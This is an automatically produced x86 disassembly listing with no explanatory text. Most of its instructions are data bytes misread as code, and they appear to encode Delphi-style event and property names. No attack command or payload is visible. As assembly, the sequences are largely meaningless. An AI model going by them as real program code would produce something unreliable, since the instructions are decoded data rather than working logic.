loopne r-xdata
jo r-xdata
mov ebx 0xd80043
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
fadd [ eax ]
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
js r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
mov ebp 0x1180043
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
je r-xdata
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
mov ebp 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
outsd
js r-xdata
push ebx
je r-xdata
dec edi
outsb
or [ ebx + 0xe00043 ] bh
add bh bh
add [ eax ] al
jmp eax
in al 0xbb
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x64 ] bp
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
outsd
outsb
je r-xdata
inc esp
jb r-xdata
mov esp 0xe80043
add bh bh
call 0x2424ddd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
popad
outsb
popad
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
int3
mov edi 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
insb
bound edx [ esi + 0x69 ]
jb r-xdata
jb r-xdata
cmp [ ebx + 0xd80043 ] 0x0
adc eax 0x47424c54
jne r-xdata
popad
je r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
add [ eax ] al
add [ eax + 0x4f090025 ] al
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
popad
jb r-xdata
inc ebx
inc esp
jb r-xdata
push 0x65
popad
je r-xdata
add [ eax + edx + 0x40 ] dl
add ah cl
adc [ eax ] al
insb
dec edi
jb r-xdata
je r-xdata
outsb
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
jb r-xdata
inc esp
outsd
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
ror [ bx + 0x43 ] 0x1
push ebx
inc ebx
add [ edx + eax ] bh
add al ch
aam 0x43
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
jb r-xdata
int3
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
je r-xdata
dec eax
push eax
inc ebx
jb r-xdata
int3
popad
je r-xdata
jb r-xdata
jb r-xdata
inc esp
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsb
add [ ebx ] al
or eax 0x73694c54
je r-xdata
inc ebx
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
ror [ eax + 0x50 ] 0x43
je r-xdata
dec esp
inc edx
inc edi
or [ edi ] al
add cl [ eax ]
pop es
add [ eax ] al
mov dh 0x52
inc ebx
add [ esi ] bl
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
je r-xdata
lea eax [ eax ]
mov al [ 0x8004350 ]
ja r-xdata
add ah cl
inc ebx
xor [ eax ] eax
lodsb [ esi ]
mov [ ebx ] eax
fdivr [ ebx + 0x44 ]
adc [ eax ] al
add [ ecx * 8 + 0x10cc0043 ] ah
inc eax
add [ ebp + 0x51a40040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 + 0x53340043 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1e004352 ] dh
inc esp
add [ eax - 0x59 ] al
inc ecx
jb r-xdata
jb r-xdata
arpl [ eax + eax + 0x24 ] si
int 0x43
add [ eax + edx + 0x40 ] dl
add [ ecx + edx + 0x40 ] bl
add [ ebx + 0x435104c0 ] cl
dec edi
bound ebp [ edx + 0x65 ]
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
popad
je r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
inc ebp
add al 0x44
jbe r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc eax
add [ ebp + 0x50a00040 ] cl
inc ebx
add [ eax ] cl
jne r-xdata
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ecx + ecx * 4 + 0x7bdc0043 ] ch
inc esp
xor al 0x40
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
mov eax eax
push ebx
je r-xdata
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
js r-xdata
ja r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
add al 0x51
inc ebx
imul ebp [ esi + 0x67 ] 0x43cd2400
push ebx
je r-xdata
ja r-xdata
insb
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
je r-xdata
inc ebx
popad
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
imul ebp [ esi + 0x67 ] 0x746e4907
sub_4342f3
clc
jb r-xdata
inc esp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
imul esi [ eax ] 0xffffffc2
inc ebx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
mov al 0x78
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
mov ecx 0x8a40043
inc esp
add ah dl
or [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xb0656c62
js r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
les eax [ edi ]
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070037 ] al
mov al 0x78
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x64 ] bp
mov ebp 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
jo r-xdata
fadd [ eax ]
jb r-xdata
outsb
dec edi
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94243ea
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
popad
outsb
mov al 0x78
js r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
mov ebx 0xd80043
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
popad
add [ eax ] ch
add [ eax ] eax
[ eax ]
bound eax [ eax ]
mov eax eax
ja r-xdata
dec edi
outsb
push ebx
je r-xdata
or [ ebx + 0xe00043 ] bh
add bh bh
add [ eax ] al
jmp eax
in al 0xbb
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
js r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
add [ eax ] al
add [ esi + eax * 8 + 0x34640043 ] bl
inc eax
jb r-xdata
jb r-xdata
je r-xdata
push ebx
jb r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
mov ebx 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
mov al 0x78
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
mov esp 0xf00043
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
mov ebp 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
inc esp
outsd
ja r-xdata
inc ebx
add [ eax - 0x31 ] al
inc esp
add [ eax ] dh
clc
inc ebx
add al ah
jl r-xdata
add ah cl
add eax [ edx ]
or al bh
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 + 0x43 ] dh
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x434654c0 ] cl
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
mov edi 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
cmp [ ebx + 0xd80043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x48
add [ eax - 0x8 ] dl
inc ebx
add [ eax - 0x31 ] dl
inc esp
add [ eax + 0x4400442d ] dh
stc
inc ebx
add [ ecx + edi * 8 - 0x78fffbd ] al
inc ebx
add [ edi + ecx * 8 + 0x44 ] ah
add [ eax - 0x31 ] ch
inc esp
add [ eax + edi * 8 - 0x9fbffbd ] dl
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
add [ eax - 0x9 ] ch
inc ebx
add [ esi + ecx * 8 + 0x2da80044 ] dh
inc esp
add al ah
clc
inc ebx
add [ edi + esi * 8 - 0x30fbffbd ] bl
inc esp
add [ eax ] bl
iretd
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc ebx
add [ eax ] al
add al 0x42
add [ eax + edi * 8 + 0x3500043 ] dh
inc edx
add ah ah
add eax [ edx ]
cmp [ edx + eax * 2 ] al
add [ eax ] cl
clc
jb r-xdata
jb r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
and al 0xcd
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x4346f8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
clc
inc esi
inc ebx
push esp
inc esi
inc ebx
add [ ecx * 8 + 0x10540043 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ edx - 0x3f74ffc0 ] bh
lea eax [ bx + si ]
in al 0x45
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
je r-xdata
outsd
jb r-xdata
pop es
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x48be0043 ] ah
inc ebx
add [ edx + eax ] cl
add [ eax ] al
jo r-xdata
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x47d4c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec eax
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
je r-xdata
add ah dh
test [ ebx ] 0xa8
jl r-xdata
add al 0x42
add [ eax + eax ] ch
add [ eax ] al
pushfd
mov [ ebx ] 0x64
xor al 0x40
inc ebx
add [ eax ] al
je r-xdata
outsb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
inc esp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
inc esp
jge r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
add al dl
xor [ eax ] eax
cwde
add eax [ edx ]
test [ ebx + eax * 2 ] bh
int3
jb r-xdata
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add al ch
jge r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x7ee00044 ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax + eax * 2 + 0x44 ] al
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
inc esp
add al dh
jge r-xdata
add al dh
jbe r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x7bffbdfd ] bl
jl r-xdata
inc eax
outsd
je r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc eax
outsd
insb
aam 0x47
add ah ch
jge r-xdata
add ah dl
dec eax
add [ eax + 0x4e ] dh
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
inc edx
mov ah 0x31
insb
add [ 0x65646e49 ] al
js r-xdata
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
sbb [ edi + 0x43 ] bh
insb
jae r-xdata
inc ebx
add [ ecx * 8 + 0xb0043 ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
push 0xb400437e
jle r-xdata
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
je r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 - 0x7fd3ffbc ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax - 0x80 ] ch
inc ebx
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ ebp + 0x49480040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x43 ] bl
add [ eax - 0x1fffbc83 ] bl
jge r-xdata
add ah cl
inc ebx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ebx ] sub_437f7c
mov al [ 0x700437f ]
push esp
inc edx
jne r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add al ch
jge r-xdata
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 ] bl
inc ebx
add [ esi + 0x4a ] cl
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax - 0x53ffbcb9 ] cl
add al [ edx ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
dec edx
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax - 0x73ffbbd0 ] al
push es
pushad
sub [ eax + eax + 0x74 ] eax
std
inc ebx
add dh bh
enter 0x4409 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69420800
je r-xdata
mov eax eax
pop esp
dec edx
add ah ch
jge r-xdata
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
add [ esi + ebp * 2 + 0x44 ] ch
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
dec esp
mov ecx 0x8a40043
inc esp
add ah dl
or [ eax + eax - 0x60 ] al
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
add [ eax ] cl
inc edx
je r-xdata
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
add [ edi + edi * 2 + 0x80043 ] ah
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add bh bh
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax + 0x4208000d ] al
outsb
dec eax
dec ecx
inc ebx
add al dl
dec eax
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
dec eax
call [ eax + eax * 4 - 0x7efbffbd ]
inc ebx
add [ eax - 0x7fffbc7f ] cl
add [ ebx ] 0x8
add [ ebx ] 0xdc
inc ecx
add [ edi + edi * 8 + 0x2cc0041 ] ah
inc edx
add [ eax ] bl
jg r-xdata
inc eax
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
xor [ eax ] eax
shl [ ecx ] 0x1
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
outsd
insb
lea eax [ eax ]
aam 0x48
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
inc esp
add [ ecx ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ edx + 0x69 ] al
inc ebx
je r-xdata
inc esp
add al dh
jge r-xdata
add al dh
jbe r-xdata
add [ eax ] dl
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] bl
add bh bh
ror [ ecx ] 0x1
inc esp
mov dl 0x43
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc al
sub [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
and [ esi ] dl
inc edx
add [ eax ] ch
popad
dec ebp
outsd
add [ gs : eax ] dl
mov dl 0x43
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
popad
add [ eax ] al
add ah dh
mov [ ecx ] es
cmp al 0x0
add dh bh
sbb ah bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
mov ecx 0x610043
add bh bh
clc
sti
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
push 0x5f004177
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
imul ebp [ esi + 0x74 ] r-xdata
pushad
